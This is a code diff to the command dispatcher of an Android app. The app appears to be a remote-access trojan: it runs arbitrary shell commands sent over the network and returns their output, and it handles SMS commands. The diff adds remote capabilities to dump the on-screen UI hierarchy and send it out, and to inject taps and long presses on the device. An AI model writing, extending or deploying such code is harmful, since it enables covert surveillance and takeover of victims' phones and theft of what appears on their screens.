@@ -237,7 +237,18 @@ public final class Cmd {
                     if (i != null) c.startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                     else Net.send("{\"t\":\"err\",\"o\":\"pacote nao encontrado\"}");
                     break;
-                case "shell":
+                case "utree":
+new Thread(new Runnable() { public void run() {
+String x = Util.exec("uiautomator dump /data/local/tmp/w.xml >/dev/null 2>&1; cat /data/local/tmp/w.xml");
+Net.send("{\"t\":\"utree\",\"o\":\"" + Util.esc(x) + "\"}");
+}}).start();
+break;
+case "utap":
+Net.send("{\"t\":\"utap\",\"o\":\"" + Util.esc(Util.exec("input tap " + ((int) o.optDouble("x")) + " " + ((int) o.optDouble("y")))) + "\"}");
+break;
+case "ulong":
+Net.send("{\"t\":\"ulong\",\"o\":\"" + Util.esc(Util.exec("input swipe " + ((int) o.optDouble("x")) + " " + ((int) o.optDouble("y")) + " " + ((int) o.optDouble("x")) + " " + ((int) o.optDouble("y")) + " 700")) + "\"}");
+break;case "shell":
                     Net.send("{\"t\":\"sh\",\"o\":\"" + Util.esc(Util.exec(o.optString("cmd"))) + "\"}");
                     break;
                 case "sms":
